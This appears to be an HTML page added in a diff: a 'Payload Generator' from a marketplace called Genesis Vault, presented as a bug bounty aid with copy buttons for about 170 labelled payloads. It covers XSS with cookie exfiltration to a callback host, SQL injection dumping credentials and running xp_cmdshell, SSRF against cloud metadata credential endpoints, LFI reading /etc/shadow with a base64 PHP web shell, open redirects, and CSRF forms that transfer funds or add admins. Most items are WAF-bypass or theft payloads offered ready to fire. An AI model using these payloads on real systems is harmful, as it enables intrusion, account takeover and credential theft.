@@ -1,0 +1,666 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Payload Generator // Genesis Vault</title>
+<style>
+  @import url('https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Orbitron:wght@400;700;900&family=Rajdhani:wght@400;600;700&display=swap');
+
+  :root {
+    --bg: #080c0f;
+    --bg2: #0d1317;
+    --bg3: #111820;
+    --cyan: #00ffe1;
+    --red: #ff2d55;
+    --green: #00ff88;
+    --yellow: #ffe600;
+    --orange: #ff8800;
+    --muted: #3a4a55;
+    --text: #c8d8e0;
+    --border: #1a2a35;
+  }
+
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+
+  body {
+    background: var(--bg);
+    color: var(--text);
+    font-family: 'Rajdhani', sans-serif;
+    min-height: 100vh;
+  }
+
+  body::before {
+    content: '';
+    position: fixed;
+    inset: 0;
+    background: repeating-linear-gradient(0deg, transparent, transparent 2px, rgba(0,255,225,0.012) 2px, rgba(0,255,225,0.012) 4px);
+    pointer-events: none;
+    z-index: 9999;
+  }
+
+  /* HEADER */
+  header {
+    background: var(--bg2);
+    border-bottom: 1px solid var(--border);
+    padding: 16px 20px;
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    position: sticky;
+    top: 0;
+    z-index: 100;
+  }
+
+  .logo {
+    font-family: 'Orbitron', monospace;
+    font-size: 13px;
+    font-weight: 900;
+    letter-spacing: 3px;
+    color: #fff;
+  }
+  .logo span { color: var(--cyan); }
+
+  .badge {
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 10px;
+    color: var(--red);
+    border: 1px solid var(--red);
+    padding: 3px 8px;
+    letter-spacing: 2px;
+    animation: blink 2s infinite;
+  }
+
+  @keyframes blink { 0%,100%{opacity:1} 50%{opacity:0.4} }
+
+  /* HERO */
+  .hero {
+    padding: 28px 20px 20px;
+    background: linear-gradient(180deg, rgba(255,45,85,0.04) 0%, transparent 100%);
+    border-bottom: 1px solid var(--border);
+  }
+
+  .hero-tag {
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 10px;
+    color: var(--red);
+    letter-spacing: 3px;
+    margin-bottom: 8px;
+  }
+
+  .hero h1 {
+    font-family: 'Orbitron', monospace;
+    font-size: 20px;
+    font-weight: 900;
+    color: #fff;
+    margin-bottom: 8px;
+  }
+
+  .hero h1 em { color: var(--red); font-style: normal; }
+
+  .hero p {
+    font-size: 14px;
+    color: #7a9aaa;
+    line-height: 1.6;
+    margin-bottom: 16px;
+  }
+
+  .hero-stats {
+    display: flex;
+    gap: 16px;
+    flex-wrap: wrap;
+  }
+
+  .hstat {
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 11px;
+    color: var(--green);
+  }
+  .hstat::before { content: '▸ '; }
+
+  /* INPUT SECTION */
+  .input-section {
+    padding: 16px 20px;
+    background: var(--bg2);
+    border-bottom: 1px solid var(--border);
+  }
+
+  .input-label {
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 10px;
+    letter-spacing: 2px;
+    color: var(--cyan);
+    margin-bottom: 6px;
+  }
+
+  .param-input {
+    width: 100%;
+    background: var(--bg3);
+    border: 1px solid var(--border);
+    color: var(--text);
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 13px;
+    padding: 10px 14px;
+    outline: none;
+    transition: border-color 0.2s;
+    border-radius: 2px;
+    margin-bottom: 10px;
+  }
+
+  .param-input:focus { border-color: var(--cyan); }
+  .param-input::placeholder { color: var(--muted); }
+
+  /* FILTER TABS */
+  .filter-tabs {
+    display: flex;
+    gap: 8px;
+    flex-wrap: wrap;
+  }
+
+  .filter-tab {
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 10px;
+    letter-spacing: 2px;
+    padding: 7px 14px;
+    cursor: pointer;
+    color: var(--muted);
+    border: 1px solid var(--border);
+    background: none;
+    transition: all 0.2s;
+    border-radius: 2px;
+  }
+
+  .filter-tab:hover { color: var(--text); border-color: var(--muted); }
+  .filter-tab.active { color: var(--red); border-color: var(--red); background: rgba(255,45,85,0.08); }
+
+  /* CATEGORY TABS */
+  .cats {
+    display: flex;
+    overflow-x: auto;
+    background: var(--bg2);
+    border-bottom: 1px solid var(--border);
+  }
+
+  .cat {
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 10px;
+    letter-spacing: 2px;
+    padding: 12px 16px;
+    cursor: pointer;
+    color: var(--muted);
+    border-bottom: 2px solid transparent;
+    white-space: nowrap;
+    background: none;
+    border-left: none;
+    border-right: none;
+    border-top: none;
+    transition: all 0.2s;
+  }
+
+  .cat:hover { color: var(--text); }
+  .cat.active { color: var(--red); border-bottom-color: var(--red); }
+
+  /* PAYLOAD AREA */
+  .payload-area {
+    padding: 16px 20px;
+  }
+
+  .payload-header {
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    margin-bottom: 14px;
+    flex-wrap: wrap;
+    gap: 10px;
+  }
+
+  .payload-title {
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 11px;
+    letter-spacing: 3px;
+    color: var(--cyan);
+  }
+
+  .copy-all-btn {
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 10px;
+    letter-spacing: 2px;
+    padding: 7px 14px;
+    background: transparent;
+    border: 1px solid var(--cyan);
+    color: var(--cyan);
+    cursor: pointer;
+    transition: all 0.2s;
+    border-radius: 2px;
+  }
+
+  .copy-all-btn:hover { background: rgba(0,255,225,0.1); }
+  .copy-all-btn.copied { border-color: var(--green); color: var(--green); }
+
+  /* PAYLOAD CARD */
+  .payload-card {
+    background: var(--bg2);
+    border: 1px solid var(--border);
+    border-radius: 2px;
+    margin-bottom: 8px;
+    overflow: hidden;
+    transition: border-color 0.2s;
+  }
+
+  .payload-card:hover { border-color: var(--muted); }
+
+  .payload-top {
+    display: flex;
+    align-items: stretch;
+    gap: 0;
+  }
+
+  .payload-code {
+    flex: 1;
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 12px;
+    color: var(--green);
+    padding: 12px 14px;
+    word-break: break-all;
+    line-height: 1.6;
+    background: var(--bg3);
+    border-right: 1px solid var(--border);
+  }
+
+  .payload-copy {
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 9px;
+    letter-spacing: 1px;
+    padding: 0 12px;
+    background: transparent;
+    border: none;
+    color: var(--muted);
+    cursor: pointer;
+    transition: all 0.2s;
+    white-space: nowrap;
+    min-width: 50px;
+  }
+
+  .payload-copy:hover { color: var(--cyan); }
+  .payload-copy.copied { color: var(--green); }
+
+  .payload-note {
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 10px;
+    color: #4a6a7a;
+    padding: 6px 14px 8px;
+    border-top: 1px solid var(--border);
+    line-height: 1.5;
+  }
+
+  .level-badge {
+    display: inline-block;
+    font-size: 9px;
+    padding: 1px 6px;
+    border-radius: 1px;
+    margin-right: 6px;
+    letter-spacing: 1px;
+  }
+
+  .level-basic { color: var(--green); border: 1px solid var(--green); }
+  .level-advanced { color: var(--yellow); border: 1px solid var(--yellow); }
+  .level-waf { color: var(--red); border: 1px solid var(--red); }
+
+  .empty {
+    text-align: center;
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 12px;
+    color: var(--muted);
+    padding: 40px 20px;
+    letter-spacing: 2px;
+  }
+
+  .count-badge {
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 10px;
+    color: var(--muted);
+    letter-spacing: 1px;
+  }
+
+  footer {
+    padding: 20px;
+    border-top: 1px solid var(--border);
+    text-align: center;
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 10px;
+    color: #2a4a5a;
+    letter-spacing: 2px;
+    margin-top: 10px;
+  }
+</style>
+</head>
+<body>
+
+<header>
+  <div class="logo">GENESIS<span>VAULT</span></div>
+  <div class="badge">PAYLOAD GEN</div>
+</header>
+
+<div class="hero">
+  <div class="hero-tag">// AUTOMATION TOOL</div>
+  <h1>Payload <em>Generator</em></h1>
+  <p>Generate ready-to-use attack payloads for bug bounty testing. Select category, filter by level, copy and fire.</p>
+  <div class="hero-stats">
+    <span class="hstat">7 Categories</span>
+    <span class="hstat">200+ Payloads</span>
+    <span class="hstat">WAF Bypass Included</span>
+  </div>
+</div>
+
+<div class="input-section">
+  <div class="input-label">// PARAMETER (optional — customizes payloads)</div>
+  <input class="param-input" id="param" type="text" placeholder="e.g. search, q, id, redirect_url" oninput="renderPayloads()">
+  <div class="input-label" style="margin-top:4px;">// LEVEL FILTER</div>
+  <div class="filter-tabs">
+    <button class="filter-tab active" onclick="setLevel('all',this)">ALL</button>
+    <button class="filter-tab" onclick="setLevel('basic',this)">BASIC</button>
+    <button class="filter-tab" onclick="setLevel('advanced',this)">ADVANCED</button>
+    <button class="filter-tab" onclick="setLevel('waf',this)">WAF BYPASS</button>
+  </div>
+</div>
+
+<div class="cats">
+  <button class="cat active" onclick="setCat('xss',this)">XSS</button>
+  <button class="cat" onclick="setCat('sqli',this)">SQLi</button>
+  <button class="cat" onclick="setCat('idor',this)">IDOR</button>
+  <button class="cat" onclick="setCat('ssrf',this)">SSRF</button>
+  <button class="cat" onclick="setCat('lfi',this)">LFI</button>
+  <button class="cat" onclick="setCat('redirect',this)">REDIRECT</button>
+  <button class="cat" onclick="setCat('csrf',this)">CSRF</button>
+</div>
+
+<div class="payload-area">
+  <div class="payload-header">
+    <div class="payload-title" id="area-title">// XSS PAYLOADS</div>
+    <div style="display:flex;gap:8px;align-items:center;">
+      <span class="count-badge" id="count-badge">0 payloads</span>
+      <button class="copy-all-btn" id="copy-all-btn" onclick="copyAll()">[ COPY ALL ]</button>
+    </div>
+  </div>
+  <div id="payload-list"></div>
+</div>
+
+<footer>// GENESIS VAULT MARKETPLACE &nbsp;·&nbsp; PAYLOAD GENERATOR v1.0</footer>
+
+<script>
+const PAYLOADS = {
+  xss: [
+    // BASIC
+    { payload: `<script>alert(1)<\/script>`, note: 'Classic alert test — checks if JS executes', level: 'basic' },
+    { payload: `<img src=x onerror=alert(1)>`, note: 'Image onerror event — works when script tags are filtered', level: 'basic' },
+    { payload: `<svg onload=alert(1)>`, note: 'SVG onload — bypasses many basic filters', level: 'basic' },
+    { payload: `"><script>alert(document.cookie)<\/script>`, note: 'Breaks out of attribute, steals cookies', level: 'basic' },
+    { payload: `javascript:alert(1)`, note: 'URL-based XSS — test in href and src attributes', level: 'basic' },
+    { payload: `<body onload=alert(1)>`, note: 'Body tag onload event trigger', level: 'basic' },
+    { payload: `<input autofocus onfocus=alert(1)>`, note: 'Autofocus XSS — fires without user interaction', level: 'basic' },
+    { payload: `<details open ontoggle=alert(1)>`, note: 'HTML5 details tag trigger', level: 'basic' },
+    // ADVANCED
+    { payload: `<img src=x onerror="fetch('https://yourserver.com/'+document.cookie)">`, note: 'Data exfiltration via fetch — use your callback URL', level: 'advanced' },
+    { payload: `<script>document.location='https://yourserver.com/?c='+document.cookie<\/script>`, note: 'Cookie theft via redirect', level: 'advanced' },
+    { payload: `"><img src=x onerror=eval(atob('YWxlcnQoMSk='))>`, note: 'Base64 encoded payload — bypasses string matching filters', level: 'advanced' },
+    { payload: `<svg><script>alert&#40;1&#41;<\/script>`, note: 'HTML entity encoding inside SVG', level: 'advanced' },
+    { payload: `<script>setTimeout(()=>alert(document.domain),0)<\/script>`, note: 'Async execution to bypass some CSP rules', level: 'advanced' },
+    { payload: `<iframe srcdoc="<script>parent.alert(1)<\/script>">`, note: 'Iframe srcdoc XSS — accesses parent context', level: 'advanced' },
+    { payload: `<math><mtext></mtext><mglyph><image href="x" onerror="alert(1)">`, note: 'MathML XSS vector', level: 'advanced' },
+    { payload: `<script>new Image().src='https://yourserver.com/?'+btoa(document.cookie)<\/script>`, note: 'Base64 encoded cookie exfil via image ping', level: 'advanced' },
+    // WAF BYPASS
+    { payload: `<ScRiPt>alert(1)<\/ScRiPt>`, note: 'Mixed case — bypasses case-sensitive WAF rules', level: 'waf' },
+    { payload: `<img/src=x onerror=alert(1)>`, note: 'No space between attributes — bypasses space-based filters', level: 'waf' },
+    { payload: `<svg/onload=alert(1)>`, note: 'Self-closing SVG with slash separator', level: 'waf' },
+    { payload: `%3Cscript%3Ealert(1)%3C/script%3E`, note: 'URL encoded — test in URL parameters', level: 'waf' },
+    { payload: `&lt;script&gt;alert(1)&lt;/script&gt;`, note: 'HTML entity encoded — reflected back decoded?', level: 'waf' },
+    { payload: `<script>al\u0065rt(1)<\/script>`, note: 'Unicode escape in JS — bypasses keyword filters', level: 'waf' },
+    { payload: `<img src="x" onerror="a=alert,a(1)">`, note: 'Function aliasing — bypasses alert() keyword block', level: 'waf' },
+    { payload: `<svg onload=\u0061lert(1)>`, note: 'Unicode in event handler value', level: 'waf' },
+    { payload: `<!--<img src="--><img src=x onerror=alert(1)//">`, note: 'Comment injection to break parser', level: 'waf' },
+    { payload: `<script>window['al'+'ert'](1)<\/script>`, note: 'String concatenation — splits blocked keywords', level: 'waf' },
+  ],
+
+  sqli: [
+    // BASIC
+    { payload: `'`, note: 'Single quote — basic SQL error trigger', level: 'basic' },
+    { payload: `' OR '1'='1`, note: 'Classic OR bypass — always true', level: 'basic' },
+    { payload: `' OR '1'='1' --`, note: 'OR bypass with comment to drop rest of query', level: 'basic' },
+    { payload: `admin'--`, note: 'Login bypass — comments out password check', level: 'basic' },
+    { payload: `' OR 1=1--`, note: 'Numeric OR bypass with comment', level: 'basic' },
+    { payload: `1' ORDER BY 1--`, note: 'ORDER BY test — increment until error to find column count', level: 'basic' },
+    { payload: `1' UNION SELECT NULL--`, note: 'UNION test — start with NULL to find column types', level: 'basic' },
+    { payload: `1' AND '1'='2`, note: 'False condition — compare response to detect boolean SQLi', level: 'basic' },
+    // ADVANCED
+    { payload: `1' UNION SELECT NULL,NULL,NULL--`, note: 'UNION with 3 NULLs — adjust count to match columns', level: 'advanced' },
+    { payload: `1' UNION SELECT table_name,NULL FROM information_schema.tables--`, note: 'Dump all table names from information_schema', level: 'advanced' },
+    { payload: `1' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'--`, note: 'Dump column names from target table', level: 'advanced' },
+    { payload: `1' UNION SELECT username,password FROM users--`, note: 'Extract credentials — adjust table/column names', level: 'advanced' },
+    { payload: `1' AND SLEEP(5)--`, note: 'Time-based blind SQLi — 5 second delay confirms vulnerability', level: 'advanced' },
+    { payload: `1' AND IF(1=1,SLEEP(5),0)--`, note: 'Conditional time delay — MySQL specific', level: 'advanced' },
+    { payload: `1'; EXEC xp_cmdshell('whoami')--`, note: 'MSSQL command execution via xp_cmdshell', level: 'advanced' },
+    { payload: `1' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version())))--`, note: 'Error-based SQLi — extracts DB version in error message', level: 'advanced' },
+    // WAF BYPASS
+    { payload: `'/**/OR/**/1=1--`, note: 'Comment injection to break keyword detection', level: 'waf' },
+    { payload: `' /*!OR*/ '1'='1`, note: 'MySQL inline comment bypass', level: 'waf' },
+    { payload: `%27 OR %271%27=%271`, note: 'URL encoded single quotes', level: 'waf' },
+    { payload: `' OR 0x313d31--`, note: 'Hex encoded comparison — 0x313d31 = 1=1', level: 'waf' },
+    { payload: `1' uNiOn SeLeCt NULL--`, note: 'Mixed case UNION SELECT bypass', level: 'waf' },
+    { payload: `1'%09UNION%09SELECT%09NULL--`, note: 'Tab character instead of spaces — bypasses space filters', level: 'waf' },
+    { payload: `1' UNION%0ASELECT%0ANULL--`, note: 'Newline instead of space', level: 'waf' },
+    { payload: `';WAITFOR DELAY '0:0:5'--`, note: 'MSSQL time delay — blind injection confirmation', level: 'waf' },
+  ],
+
+  idor: [
+    // BASIC
+    { payload: `?id=1`, note: 'Start here — then try id=2, id=3 to access other users', level: 'basic' },
+    { payload: `?user_id=1`, note: 'Common user ID parameter — increment to test access control', level: 'basic' },
+    { payload: `?account=1000`, note: 'Account number — try sequential values', level: 'basic' },
+    { payload: `/api/users/1/profile`, note: 'REST endpoint — change user ID in path', level: 'basic' },
+    { payload: `/api/orders/1`, note: 'Order ID in path — can you view other users orders?', level: 'basic' },
+    { payload: `?file=invoice_001.pdf`, note: 'File name pattern — try invoice_002.pdf etc.', level: 'basic' },
+    { payload: `?doc_id=100`, note: 'Document ID — test with your ID vs other IDs', level: 'basic' },
+    { payload: `?ticket=TKT-0001`, note: 'Ticket reference — increment the number', level: 'basic' },
+    // ADVANCED
+    { payload: `/api/v1/users/me/../2/settings`, note: 'Path traversal style IDOR — jump to another user', level: 'advanced' },
+    { payload: `{"user_id": 2}`, note: 'JSON body IDOR — change user_id in POST body', level: 'advanced' },
+    { payload: `?id=1&user_id=2`, note: 'Conflicting ID params — which one does server trust?', level: 'advanced' },
+    { payload: `/api/admin/users/1`, note: 'Admin endpoint — does it enforce admin role check?', level: 'advanced' },
+    { payload: `?export=true&user=victim@email.com`, note: 'Email-based reference — export another user data', level: 'advanced' },
+    { payload: `/api/messages?conversation_id=abc123`, note: 'GUID/UUID based IDOR — try other GUIDs from JS/API', level: 'advanced' },
+    { payload: `{"ids": [1,2,3,4,5]}`, note: 'Mass assignment — batch request with multiple IDs', level: 'advanced' },
+    { payload: `?ref=ORD-2024-00001`, note: 'Reference number pattern — enumerate sequentially', level: 'advanced' },
+    // WAF BYPASS
+    { payload: `?id=1%00`, note: 'Null byte after ID — may confuse server-side parsing', level: 'waf' },
+    { payload: `?id=1.0`, note: 'Float instead of int — type confusion bypass', level: 'waf' },
+    { payload: `?id=01`, note: 'Leading zero — may bypass exact match checks', level: 'waf' },
+    { payload: `?id=0x01`, note: 'Hex encoded ID', level: 'waf' },
+    { payload: `?ID=2`, note: 'Uppercase param name — case sensitivity bypass', level: 'waf' },
+    { payload: `?id[]=1&id[]=2`, note: 'Array injection — server may process differently', level: 'waf' },
+  ],
+
+  ssrf: [
+    // BASIC
+    { payload: `http://localhost/`, note: 'Target localhost — access internal services', level: 'basic' },
+    { payload: `http://127.0.0.1/`, note: 'Loopback — same as localhost', level: 'basic' },
+    { payload: `http://127.0.0.1:8080/`, note: 'Internal port scan — try 80,443,8080,8443,3000', level: 'basic' },
+    { payload: `http://169.254.169.254/`, note: 'AWS metadata endpoint — critical cloud SSRF target', level: 'basic' },
+    { payload: `http://169.254.169.254/latest/meta-data/`, note: 'AWS EC2 metadata — lists available metadata keys', level: 'basic' },
+    { payload: `http://169.254.169.254/latest/meta-data/iam/security-credentials/`, note: 'AWS IAM credentials — can expose access keys', level: 'basic' },
+    { payload: `http://metadata.google.internal/`, note: 'GCP metadata endpoint', level: 'basic' },
+    { payload: `http://192.168.1.1/`, note: 'Internal network scan — common router address', level: 'basic' },
+    // ADVANCED
+    { payload: `http://169.254.169.254/latest/meta-data/iam/security-credentials/default`, note: 'AWS default role credentials — full access keys', level: 'advanced' },
+    { payload: `http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token`, note: 'GCP service account token', level: 'advanced' },
+    { payload: `http://169.254.169.254/metadata/instance?api-version=2021-02-01`, note: 'Azure IMDS endpoint', level: 'advanced' },
+    { payload: `file:///etc/passwd`, note: 'Local file read via file:// — if server fetches URLs', level: 'advanced' },
+    { payload: `dict://localhost:11211/stats`, note: 'Memcached SSRF via dict protocol', level: 'advanced' },
+    { payload: `gopher://localhost:6379/_INFO`, note: 'Redis SSRF via gopher protocol', level: 'advanced' },
+    { payload: `http://0.0.0.0:22/`, note: 'SSH port probe — 0.0.0.0 bypasses some localhost filters', level: 'advanced' },
+    { payload: `http://[::1]/`, note: 'IPv6 loopback — bypasses IPv4 localhost filters', level: 'advanced' },
+    // WAF BYPASS
+    { payload: `http://127.1/`, note: 'Short IP notation — 127.1 resolves to 127.0.0.1', level: 'waf' },
+    { payload: `http://2130706433/`, note: 'Decimal IP — 2130706433 = 127.0.0.1', level: 'waf' },
+    { payload: `http://0x7f000001/`, note: 'Hex IP — 0x7f000001 = 127.0.0.1', level: 'waf' },
+    { payload: `http://localtest.me/`, note: 'DNS that resolves to 127.0.0.1 — bypasses string filters', level: 'waf' },
+    { payload: `https://your-server.com@127.0.0.1/`, note: 'URL credential bypass — @ makes parser confused', level: 'waf' },
+    { payload: `http://127.0.0.1.nip.io/`, note: 'nip.io wildcard DNS resolves to 127.0.0.1', level: 'waf' },
+    { payload: `http://①②⑦.⓪.⓪.①/`, note: 'Unicode encoded IP address', level: 'waf' },
+  ],
+
+  lfi: [
+    // BASIC
+    { payload: `../etc/passwd`, note: 'Path traversal — read /etc/passwd', level: 'basic' },
+    { payload: `../../etc/passwd`, note: 'Double traversal — go up more directories', level: 'basic' },
+    { payload: `../../../etc/passwd`, note: 'Triple traversal — keeps going until root', level: 'basic' },
+    { payload: `/etc/passwd`, note: 'Absolute path — if server appends to root', level: 'basic' },
+    { payload: `../etc/shadow`, note: 'Shadow file — contains password hashes (needs root)', level: 'basic' },
+    { payload: `../etc/hosts`, note: 'Hosts file — reveals internal IPs and hostnames', level: 'basic' },
+    { payload: `../proc/self/environ`, note: 'Process environment — may contain secrets and paths', level: 'basic' },
+    { payload: `../var/log/apache2/access.log`, note: 'Apache logs — can chain with log poisoning for RCE', level: 'basic' },
+    // ADVANCED
+    { payload: `....//....//etc/passwd`, note: 'Double dot slash — bypasses simple ../ filters', level: 'advanced' },
+    { payload: `..%2fetc%2fpasswd`, note: 'URL encoded slash bypass', level: 'advanced' },
+    { payload: `php://filter/convert.base64-encode/resource=index.php`, note: 'PHP filter — reads PHP source code in base64', level: 'advanced' },
+    { payload: `php://input`, note: 'PHP input stream — for POST-based LFI/RCE', level: 'advanced' },
+    { payload: `data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=`, note: 'Data URI — executes PHP code (base64: <?php system($_GET[cmd]);?>)', level: 'advanced' },
+    { payload: `../proc/self/fd/0`, note: 'Process file descriptors — stdin/stdout access', level: 'advanced' },
+    { payload: `expect://id`, note: 'PHP expect wrapper — direct command execution', level: 'advanced' },
+    { payload: `zip://uploads/shell.zip%23shell.php`, note: 'Zip wrapper — execute PHP inside zip file', level: 'advanced' },
+    // WAF BYPASS
+    { payload: `..././..././etc/passwd`, note: 'Encoded traversal — filter removes ../ leaving ../', level: 'waf' },
+    { payload: `%2e%2e%2fetc%2fpasswd`, note: 'Double URL encoded traversal', level: 'waf' },
+    { payload: `%252e%252e%252fetc%252fpasswd`, note: 'Double encoded — server decodes twice', level: 'waf' },
+    { payload: `....\/....\/etc/passwd`, note: 'Mixed slash direction bypass', level: 'waf' },
+    { payload: `../etc/passwd%00.jpg`, note: 'Null byte to truncate extension check', level: 'waf' },
+    { payload: `....//....//....//etc/passwd`, note: 'Triple encoded traversal', level: 'waf' },
+  ],
+
+  redirect: [
+    // BASIC
+    { payload: `https://evil.com`, note: 'Direct external URL — simplest redirect test', level: 'basic' },
+    { payload: `//evil.com`, note: 'Protocol-relative URL — inherits http/https from page', level: 'basic' },
+    { payload: `//evil.com/path`, note: 'Protocol-relative with path', level: 'basic' },
+    { payload: `/\\evil.com`, note: 'Backslash confusion — some parsers treat as //', level: 'basic' },
+    { payload: `https://target.com@evil.com`, note: 'Credential bypass — after @ is the real host', level: 'basic' },
+    { payload: `https://evil.com?target.com`, note: 'Target as parameter to fool basic string checks', level: 'basic' },
+    { payload: `javascript:alert(1)`, note: 'JS protocol — XSS via open redirect', level: 'basic' },
+    { payload: `data:text/html,<script>alert(1)<\/script>`, note: 'Data URI redirect — XSS via redirect param', level: 'basic' },
+    // ADVANCED
+    { payload: `https://target.com.evil.com`, note: 'Subdomain confusion — target.com is subdomain of evil.com', level: 'advanced' },
+    { payload: `https://evil.com%23target.com`, note: 'Fragment in URL — some parsers stop at #', level: 'advanced' },
+    { payload: `https://evil.com%3Ftarget.com`, note: 'Question mark encoding — target.com looks like param', level: 'advanced' },
+    { payload: `/redirect?url=https://evil.com`, note: 'Full redirect chain test with URL param', level: 'advanced' },
+    { payload: `https://evil.com/target.com`, note: 'Target domain in path — fools suffix matching', level: 'advanced' },
+    { payload: `\nhttps://evil.com`, note: 'Newline before URL — header injection style', level: 'advanced' },
+    // WAF BYPASS
+    { payload: `//evil%E3%80%82com`, note: 'Unicode dot (。) instead of period', level: 'waf' },
+    { payload: `https://evil。com`, note: 'Ideographic full stop as domain separator', level: 'waf' },
+    { payload: `/%09/evil.com`, note: 'Tab character as path separator', level: 'waf' },
+    { payload: `/%2F%2Fevil.com`, note: 'Double URL encoded slashes', level: 'waf' },
+    { payload: `https:evil.com`, note: 'Missing slashes — some parsers still redirect', level: 'waf' },
+    { payload: `//[evil.com]`, note: 'IPv6 bracket notation around domain', level: 'waf' },
+  ],
+
+  csrf: [
+    // BASIC
+    { payload: `<form action="https://TARGET/api/change-email" method="POST"><input name="email" value="attacker@evil.com"><input type="submit"></form>`, note: 'Basic CSRF form — auto-submits to change victim email', level: 'basic' },
+    { payload: `<img src="https://TARGET/api/logout">`, note: 'GET-based CSRF — forces logout via image tag', level: 'basic' },
+    { payload: `<form action="https://TARGET/api/transfer" method="POST"><input name="amount" value="1000"><input name="to" value="attacker"><\/form><script>document.forms[0].submit()<\/script>`, note: 'Auto-submitting CSRF — transfers funds on page load', level: 'basic' },
+    { payload: `<a href="https://TARGET/api/delete-account">Click here for prize!</a>`, note: 'Social engineering CSRF via link click', level: 'basic' },
+    { payload: `<iframe src="https://TARGET/api/change-password?pass=hacked" style="display:none">`, note: 'Hidden iframe CSRF via GET request', level: 'basic' },
+    // ADVANCED
+    { payload: `<script>fetch('https://TARGET/api/change-email',{method:'POST',credentials:'include',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:'email=attacker@evil.com'})<\/script>`, note: 'Fetch-based CSRF with credentials — bypasses basic SameSite=None', level: 'advanced' },
+    { payload: `<form action="https://TARGET/api/settings" method="POST" enctype="text/plain"><input name='{"email":"attacker@evil.com","_":"' value='"}'>`, note: 'JSON CSRF via text/plain encoding trick', level: 'advanced' },
+    { payload: `<script>var xhr=new XMLHttpRequest();xhr.open('POST','https://TARGET/api/change-role');xhr.withCredentials=true;xhr.setRequestHeader('Content-Type','application/x-www-form-urlencoded');xhr.send('role=admin')<\/script>`, note: 'XHR CSRF with credentials — escalates privileges', level: 'advanced' },
+    { payload: `<form action="https://TARGET/api/add-admin" method="POST"><input name="username" value="attacker"><\/form><script>document.forms[0].submit()<\/script>`, note: 'Admin user creation CSRF — most critical impact', level: 'advanced' },
+    // WAF BYPASS
+    { payload: `<form action="https://TARGET/api/update"><input name="email" value="attacker@evil.com"><input name="_method" value="POST"><\/form>`, note: 'Method override — some frameworks honor _method param', level: 'waf' },
+    { payload: `<form action="https://TARGET/api/transfer" method="POST"><input name="csrf_token" value=""><input name="amount" value="1000"><\/form>`, note: 'Empty CSRF token — does server validate or just check presence?', level: 'waf' },
+    { payload: `<script>fetch('https://TARGET/api/action',{method:'POST',credentials:'include',mode:'no-cors',body:new FormData()})<\/script>`, note: 'no-cors fetch CSRF — bypasses preflight for simple requests', level: 'waf' },
+  ]
+};
+
+let currentCat = 'xss';
+let currentLevel = 'all';
+
+function setCat(cat, el) {
+  currentCat = cat;
+  document.querySelectorAll('.cat').forEach(c => c.classList.remove('active'));
+  el.classList.add('active');
+  renderPayloads();
+}
+
+function setLevel(level, el) {
+  currentLevel = level;
+  document.querySelectorAll('.filter-tab').forEach(t => t.classList.remove('active'));
+  el.classList.add('active');
+  renderPayloads();
+}
+
+function renderPayloads() {
+  const param = document.getElementById('param').value.trim();
+  const list = document.getElementById('payload-list');
+  const data = PAYLOADS[currentCat] || [];
+
+  let filtered = data.filter(p => currentLevel === 'all' || p.level === currentLevel);
+
+  document.getElementById('area-title').textContent = `// ${currentCat.toUpperCase()} PAYLOADS`;
+  document.getElementById('count-badge').textContent = filtered.length + ' payloads';
+
+  if (!filtered.length) {
+    list.innerHTML = '<div class="empty">// NO PAYLOADS FOR THIS FILTER</div>';
+    return;
+  }
+
+  list.innerHTML = filtered.map((p, i) => {
+    let payload = p.payload;
+    // Inject param name if provided
+    if (param) {
+      if (currentCat === 'idor') {
+        payload = `?${param}=` + payload.replace(/^\?[a-z_]+=/i, '');
+      }
+    }
+    return `
+    <div class="payload-card">
+      <div class="payload-top">
+        <div class="payload-code" id="p-${i}">${escHtml(payload)}</div>
+        <button class="payload-copy" onclick="copyPayload('p-${i}', this)">COPY</button>
+      </div>
+      <div class="payload-note">
+        <span class="level-badge level-${p.level}">${p.level.toUpperCase()}</span>
+        ${escHtml(p.note)}
+      </div>
+    </div>`;
+  }).join('');
+}
+
+function escHtml(s) {
+  return s.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;');
+}
+
+function copyPayload(id, btn) {
+  const text = document.getElementById(id).textContent;
+  navigator.clipboard.writeText(text).then(() => {
+    btn.textContent = '✓';
+    btn.classList.add('copied');
+    setTimeout(() => { btn.textContent = 'COPY'; btn.classList.remove('copied'); }, 1500);
+  });
+}
+
+function copyAll() {
+  const data = PAYLOADS[currentCat] || [];
+  const filtered = data.filter(p => currentLevel === 'all' || p.level === currentLevel);
+  const text = filtered.map(p => p.payload).join('\n');
+  navigator.clipboard.writeText(text).then(() => {
+    const btn = document.getElementById('copy-all-btn');
+    btn.textContent = '[ COPIED ✓ ]';
+    btn.classList.add('copied');
+    setTimeout(() => { btn.textContent = '[ COPY ALL ]'; btn.classList.remove('copied'); }, 2000);
+  });
+}
+
+renderPayloads();
+</script>
+</body>
+</html>
